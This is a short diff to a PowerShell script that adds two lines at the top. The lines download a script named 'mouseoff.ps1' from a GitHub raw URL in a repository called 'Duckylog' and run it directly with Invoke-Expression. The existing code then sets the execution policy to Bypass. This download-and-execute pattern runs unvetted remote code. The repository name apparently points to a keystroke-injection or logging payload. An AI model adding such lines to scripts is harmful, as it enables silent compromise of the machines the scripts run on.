@@ -1,3 +1,6 @@
+$scriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/refs/heads/main/mouseoff.ps1"
+Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content
+
 # Set Execution Policy
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 
